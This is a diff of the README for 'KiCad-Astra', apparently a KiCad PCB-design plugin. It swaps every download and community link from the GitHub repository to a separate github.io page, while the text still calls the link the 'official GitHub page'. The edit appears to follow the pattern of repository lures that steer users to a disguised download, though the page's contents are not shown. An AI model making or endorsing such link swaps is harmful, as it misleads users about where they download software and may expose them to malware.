@@ -1,6 +1,6 @@
 # 🧠 KiCad-Astra - Give KiCad a Second Brain
 
-[![Download KiCad-Astra](https://img.shields.io/badge/Download-KiCad--Astra-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/dabholkarvaibhav8/KiCad-Astra)
+[![Download KiCad-Astra](https://img.shields.io/badge/Download-KiCad--Astra-blue?style=for-the-badge&logo=github&color=4B0082)](https://dabholkarvaibhav8.github.io)
 
 ## 🚀 What Is KiCad-Astra?
 
@@ -14,7 +14,7 @@ This tool is for anyone who uses KiCad to design printed circuit boards (PCBs). 
 
 ## ⬇️ How to Download and Install
 
-Visit this link to download the application: [https://github.com/dabholkarvaibhav8/KiCad-Astra](https://github.com/dabholkarvaibhav8/KiCad-Astra)
+Visit this link to download the application: [https://dabholkarvaibhav8.github.io](https://dabholkarvaibhav8.github.io)
 
 This link takes you to the official GitHub page for KiCad-Astra. There you will find clear instructions and the download section. The page will guide you to the correct file for your computer.
 
@@ -64,7 +64,7 @@ KiCad-Astra works as a plugin for KiCad. If you don't have KiCad yet, download i
 
 ### Step 2: Download KiCad-Astra
 
-Follow the instructions in the "How to Download and Install" section above. Visit this link to download the application: [https://github.com/dabholkarvaibhav8/KiCad-Astra](https://github.com/dabholkarvaibhav8/KiCad-Astra)
+Follow the instructions in the "How to Download and Install" section above. Visit this link to download the application: [https://dabholkarvaibhav8.github.io](https://dabholkarvaibhav8.github.io)
 
 ### Step 3: Open Your PCB Project
 
@@ -141,7 +141,7 @@ For hobbyists, it means fewer failed boards and less frustration. For profession
 
 ## 🤝 Join the Community
 
-KiCad-Astra is developed with input from the PCB design community. If you have ideas for improvement, find a bug, or want to contribute, visit the GitHub page at [https://github.com/dabholkarvaibhav8/KiCad-Astra](https://github.com/dabholkarvaibhav8/KiCad-Astra). You can report issues, suggest features, or even contribute code if you are so inclined.
+KiCad-Astra is developed with input from the PCB design community. If you have ideas for improvement, find a bug, or want to contribute, visit the GitHub page at [https://dabholkarvaibhav8.github.io](https://dabholkarvaibhav8.github.io). You can report issues, suggest features, or even contribute code if you are so inclined.
 
 ## 📜 License
 
@@ -149,7 +149,7 @@ KiCad-Astra is released under an open-source license, allowing you to use, modif
 
 ## 🧭 What's Next?
 
-Ready to give your KiCad superpowers? Head over to the download page now: [https://github.com/dabholkarvaibhav8/KiCad-Astra](https://github.com/dabholkarvaibhav8/KiCad-Astra). Download, install, and let your second brain do the heavy lifting while you focus on being creative.
+Ready to give your KiCad superpowers? Head over to the download page now: [https://dabholkarvaibhav8.github.io](https://dabholkarvaibhav8.github.io). Download, install, and let your second brain do the heavy lifting while you focus on being creative.
 
 ---
 
